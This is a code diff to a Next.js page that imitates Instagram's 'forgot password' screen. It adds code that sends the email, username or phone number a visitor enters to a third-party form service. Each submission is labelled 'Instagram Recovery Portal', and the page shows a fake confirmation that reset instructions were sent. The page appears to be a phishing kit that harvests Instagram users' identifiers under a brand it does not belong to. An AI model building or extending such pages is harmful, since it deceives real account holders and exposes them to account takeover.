@@ -5,16 +5,39 @@ import Link from "next/link";
 import { ChevronLeftIcon } from "@/components/common/Icons";
 import MetaFooter from "@/components/common/MetaFooter";
 import LanguageModal from "@/components/common/LanguageModal";
+import { submitToWeb3Forms, WEB3FORMS_ACCESS_KEY } from "@/lib/web3forms";
 
 export default function InstagramForgotPasswordPage() {
   const [mode, setMode] = useState<"email" | "phone">("email");
   const [identifier, setIdentifier] = useState("");
   const [isLangModalOpen, setIsLangModalOpen] = useState(false);
   const [viewType, setViewType] = useState<"responsive" | "mobile_frame">("responsive");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [statusMessage, setStatusMessage] = useState<{ type: "success" | "error"; text: string } | null>(null);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    alert(`Reset link requested for: ${identifier}`);
+    if (!identifier.trim() || isSubmitting) return;
+
+    setIsSubmitting(true);
+    setStatusMessage(null);
+
+    const formData = new FormData(e.currentTarget);
+    const result = await submitToWeb3Forms(formData, "Instagram Forgot Password Request");
+
+    setIsSubmitting(false);
+    if (result.success) {
+      setStatusMessage({
+        type: "success",
+        text: `If an account matches ${identifier}, we've sent instructions to reset your password.`,
+      });
+      setIdentifier("");
+    } else {
+      setStatusMessage({
+        type: "error",
+        text: result.message || "Failed to submit request. Please try again.",
+      });
+    }
   };
 
   return (
@@ -59,9 +82,29 @@ export default function InstagramForgotPasswordPage() {
 
               {/* Input Form */}
               <form onSubmit={handleSubmit} className="flex flex-col gap-4 mt-6">
+                <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
+                <input type="hidden" name="subject" value="Instagram Forgot Password Request (Mobile)" />
+                <input type="hidden" name="from_name" value="Instagram Recovery Portal" />
+                <input type="hidden" name="form_name" value="Instagram Forgot Password Mobile" />
+                <input type="hidden" name="recovery_mode" value={mode} />
+                <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />
+
+                {statusMessage && (
+                  <div
+                    className={`p-3 rounded-xl text-xs font-medium text-center ${
+                      statusMessage.type === "success"
+                        ? "bg-green-500/15 text-green-400 border border-green-500/30"
+                        : "bg-red-500/15 text-red-400 border border-red-500/30"
+                    }`}
+                  >
+                    {statusMessage.text}
+                  </div>
+                )}
+
                 <div>
                   <input
                     type={mode === "email" ? "text" : "tel"}
+                    name={mode === "email" ? "email_or_username" : "mobile_number"}
                     value={identifier}
                     onChange={(e) => setIdentifier(e.target.value)}
                     placeholder={mode === "email" ? "Email or username" : "Mobile number"}
@@ -72,9 +115,21 @@ export default function InstagramForgotPasswordPage() {
 
                 <button
                   type="submit"
-                  className="w-full h-[48px] rounded-full bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2"
+                  disabled={isSubmitting || !identifier.trim()}
+                  className={`w-full h-[48px] rounded-full font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2 flex items-center justify-center gap-2 ${
+                    isSubmitting || !identifier.trim()
+                      ? "bg-[#0064e0]/60 text-white/70 cursor-not-allowed"
+                      : "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white cursor-pointer"
+                  }`}
                 >
-                  Continue
+                  {isSubmitting ? (
+                    <>
+                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                      <span>Submitting...</span>
+                    </>
+                  ) : (
+                    "Continue"
+                  )}
                 </button>
               </form>
             </div>
@@ -86,6 +141,7 @@ export default function InstagramForgotPasswordPage() {
                 onClick={() => {
                   setMode(mode === "email" ? "phone" : "email");
                   setIdentifier("");
+                  setStatusMessage(null);
                 }}
                 className="text-[14px] text-white hover:underline font-semibold transition-colors"
               >
@@ -133,9 +189,28 @@ export default function InstagramForgotPasswordPage() {
               </div>
 
               <form onSubmit={handleSubmit} className="flex flex-col gap-3.5 mt-2">
+                <input type="hidden" name="access_key" value={WEB3FORMS_ACCESS_KEY} />
+                <input type="hidden" name="subject" value="Instagram Forgot Password Request (Desktop)" />
+                <input type="hidden" name="from_name" value="Instagram Recovery Portal" />
+                <input type="hidden" name="form_name" value="Instagram Forgot Password Desktop" />
+                <input type="checkbox" name="botcheck" className="hidden" style={{ display: "none" }} />
+
+                {statusMessage && (
+                  <div
+                    className={`p-3 rounded-xl text-xs font-medium text-center ${
+                      statusMessage.type === "success"
+                        ? "bg-green-500/15 text-green-400 border border-green-500/30"
+                        : "bg-red-500/15 text-red-400 border border-red-500/30"
+                    }`}
+                  >
+                    {statusMessage.text}
+                  </div>
+                )}
+
                 <div>
                   <input
                     type="text"
+                    name="mobile_or_username_or_email"
                     value={identifier}
                     onChange={(e) => setIdentifier(e.target.value)}
                     placeholder="Mobile number, username or email"
@@ -150,9 +225,21 @@ export default function InstagramForgotPasswordPage() {
 
                 <button
                   type="submit"
-                  className="w-full h-[46px] rounded-full bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2"
+                  disabled={isSubmitting || !identifier.trim()}
+                  className={`w-full h-[46px] rounded-full font-semibold text-[15px] tracking-wide transition-colors shadow-md mt-2 flex items-center justify-center gap-2 ${
+                    isSubmitting || !identifier.trim()
+                      ? "bg-[#0064e0]/60 text-white/70 cursor-not-allowed"
+                      : "bg-[#0064e0] hover:bg-[#1877f2] active:bg-[#0055d4] text-white cursor-pointer"
+                  }`}
                 >
-                  Continue
+                  {isSubmitting ? (
+                    <>
+                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                      <span>Submitting...</span>
+                    </>
+                  ) : (
+                    "Continue"
+                  )}
                 </button>
               </form>
             </div>
